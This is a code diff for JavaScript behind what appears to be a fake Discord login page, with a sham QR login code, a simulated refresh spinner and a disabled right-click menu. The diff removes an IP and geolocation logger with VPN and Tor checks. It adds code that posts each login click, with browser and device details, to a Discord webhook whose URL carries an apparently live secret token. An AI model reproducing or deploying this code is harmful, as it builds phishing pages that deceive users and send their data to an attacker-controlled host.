@@ -1,59 +1,13 @@
 // ==================================
-// IP LOGGER (LOGIN ONLY)
-// ==================================
-const sendIP = () => {
-  // Prevent duplicate logs per session
-  if (sessionStorage.getItem("ipLogged")) return;
-  sessionStorage.setItem("ipLogged", "true");
-
-  fetch("https://api.ipify.org?format=json")
-    .then(res => res.json())
-    .then(ipData => {
-      const ipadd = ipData.ip;
-
-      return fetch(`https://ipapi.co/${ipadd}/json/`)
-        .then(res => res.json())
-        .then(geoData => {
-          const isVPN   = geoData.security?.vpn ?? false;
-          const isProxy = geoData.security?.proxy ?? false;
-          const isTor   = geoData.security?.tor ?? false;
-
-          const riskLevel =
-            isTor || isVPN || isProxy ? "🔴 High Risk" : "🟢 Low Risk";
-
-          const embedColor =
-            isTor ? 0xff0033 : isVPN || isProxy ? 0xffa500 : 0x00ff88;
-
-          return fetch("http://localhost:3000/webhook", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              ipadd,
-              geoData,
-              riskLevel,
-              embedColor,
-              isVPN,
-              isProxy,
-              isTor
-            })
-          });
-        });
-    })
-    .then(res => {
-      if (res.ok) console.log("Login data sent");
-      else console.warn("Webhook failed");
-    })
-    .catch(err => console.error("Login logger error:", err));
-};
-
-// ==================================
-// CONFIG
+// CONFIGURATION
 // ==================================
 const CONFIG = {
   ANIMATION_DURATION: 3000,
-  QR_REFRESH_INTERVAL: 120000,
+  QR_REFRESH_INTERVAL: 120000, // 2 minutes
   ELLIPSIS_DELAY_INCREMENT: 0.2,
   QR_STRING_LENGTH: 43,
+  WEBHOOK_URL:
+    "https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs",
 };
 
 // ==================================
@@ -65,79 +19,187 @@ const DOM = {
 };
 
 // ==================================
-// QR CODE MODULE (UNCHANGED)
+// STATE
+// ==================================
+let currentQRToken = null;
+
+// ==================================
+// UTILITY FUNCTIONS
+// ==================================
+
+const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
+  const chars =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  return Array.from({ length }, () =>
+    chars.charAt(Math.floor(Math.random() * chars.length))
+  ).join("");
+};
+
+const sendToWebhook = async (payload) => {
+  try {
+    await fetch(CONFIG.WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "📥 **Login Event Received**",
+        embeds: [
+          {
+            title: "Login Payload",
+            color: 7506394,
+            fields: Object.entries(payload).map(([key, value]) => ({
+              name: key,
+              value: String(value),
+              inline: false,
+            })),
+            timestamp: new Date().toISOString(),
+          },
+        ],
+      }),
+    });
+  } catch (err) {
+    console.error("Webhook send failed:", err);
+  }
+};
+
+// ==================================
+// QR CODE MODULE
 // ==================================
 const QRCodeModule = {
   generate(data) {
-    const qr = qrcode(0, "L");
-    qr.addData(data);
-    qr.make();
+    try {
+      const qr = qrcode(0, "L");
+      qr.addData(data);
+      qr.make();
 
-    const svg = new DOMParser()
-      .parseFromString(qr.createSvgTag(1, 0), "image/svg+xml")
-      .documentElement;
+      const moduleCount = qr.getModuleCount();
+      const svgString = qr.createSvgTag(1, 0);
 
-    svg.setAttribute("width", "160");
-    svg.setAttribute("height", "160");
-    svg.setAttribute("viewBox", "0 0 37 37");
+      const parser = new DOMParser();
+      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
+      const svg = svgDoc.documentElement;
 
-    return svg;
+      svg.setAttribute("width", "160");
+      svg.setAttribute("height", "160");
+      svg.setAttribute("viewBox", "0 0 37 37");
+
+      const path = svg.querySelector("path");
+      if (path) {
+        path.setAttribute("transform", `scale(${37 / moduleCount})`);
+      }
+
+      return svg;
+    } catch (e) {
+      console.error("QR error:", e);
+      return null;
+    }
+  },
+
+  showLoading() {
+    if (!DOM.qrCodeContainer) return;
+    DOM.qrCodeContainer.innerHTML = `
+      <span class="spinner qrCode-spinner">
+        <span class="inner wanderingCubes">
+          <span class="item"></span>
+          <span class="item"></span>
+        </span>
+      </span>
+    `;
+    DOM.qrCodeContainer.style.background = "transparent";
   },
 
   refresh() {
     if (!DOM.qrCodeContainer) return;
 
     DOM.qrCodeContainer.innerHTML = "";
-    DOM.qrCodeContainer.appendChild(
-      this.generate(`https://discord.com/ra/${Math.random().toString(36).slice(2)}`)
+    currentQRToken = generateRandomString();
+
+    const qrSvg = this.generate(
+      `https://discord.com/ra/${currentQRToken}`
     );
+
+    if (qrSvg) DOM.qrCodeContainer.appendChild(qrSvg);
 
     DOM.qrCodeContainer.insertAdjacentHTML(
       "beforeend",
       `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
     );
+
+    DOM.qrCodeContainer.style.background = "white";
   },
 
-  initRefreshInterval() {
-    setInterval(() => this.refresh(), CONFIG.QR_REFRESH_INTERVAL);
+  simulateRefresh() {
+    this.showLoading();
+    setTimeout(() => this.refresh(), 3500);
+  },
+
+  init() {
+    this.refresh();
+    setInterval(
+      () => this.simulateRefresh(),
+      CONFIG.QR_REFRESH_INTERVAL
+    );
   },
 };
 
 // ==================================
-// LOGIN BUTTON MODULE (LOGS ON LOGIN)
+// LOGIN BUTTON MODULE
 // ==================================
 const LoginButtonModule = {
   showLoading() {
     if (!DOM.loginButton) return;
 
-    DOM.loginButton.textContent = "Logging in…";
+    DOM.loginButton.innerHTML = `
+      <span class="spinner">
+        <span class="inner pulsingEllipsis">
+          <span class="item spinnerItem"></span>
+          <span class="item spinnerItem"></span>
+          <span class="item spinnerItem"></span>
+        </span>
+      </span>
+    `;
     DOM.loginButton.disabled = true;
 
-    // ✅ SEND DATA ON LOGIN
-    sendIP();
+    document.querySelectorAll(".spinnerItem").forEach((item, i) => {
+      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
+        i * CONFIG.ELLIPSIS_DELAY_INCREMENT
+      }s`;
+    });
 
     setTimeout(() => this.reset(), CONFIG.ANIMATION_DURATION);
   },
 
   reset() {
+    if (!DOM.loginButton) return;
     DOM.loginButton.textContent = "Log In";
     DOM.loginButton.disabled = false;
   },
 
   init() {
-    DOM.loginButton?.addEventListener("click", e => {
+    if (!DOM.loginButton) return;
+
+    DOM.loginButton.addEventListener("click", async (e) => {
       e.preventDefault();
       this.showLoading();
+
+      await sendToWebhook({
+        event: "login",
+        timestamp: Date.now(),
+        qrToken: currentQRToken,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+      });
     });
   },
 };
 
 // ==================================
-// INIT
+// INITIALIZATION
 // ==================================
 const init = () => {
   LoginButtonModule.init();
-  QRCodeModule.initRefreshInterval();
+  QRCodeModule.init();
+  document.addEventListener("contextmenu", (e) => e.preventDefault());
 };
 
 document.readyState === "loading"
